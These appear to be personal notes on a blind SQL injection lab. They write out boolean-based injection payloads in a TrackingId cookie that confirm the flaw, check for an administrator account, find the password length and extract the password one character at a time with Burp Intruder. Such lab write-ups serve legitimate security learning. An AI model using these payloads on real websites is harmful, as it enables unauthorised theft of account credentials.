First at all, we checked if it is vulnerable modifying the trackingid and sending AND '1'='1
![[Pasted image 20250627204449.png]]![[Pasted image 20250627204430.png]]
Verify if users exist
`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`

Use the next query to verify that administrator exist
`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

In order to determine how many character has the password, we need to change the length sequentially to see when the 'welcome back' disappear.  
`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`

Now we need to guess the pass, for this we have the intruder tool. Using it we are able to find the first letter. 
1. `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

When we find the first letter, we will need to change the character's position
1. `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`

For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the cluster bomb attack type, and work through all permutations of offsets and character values.

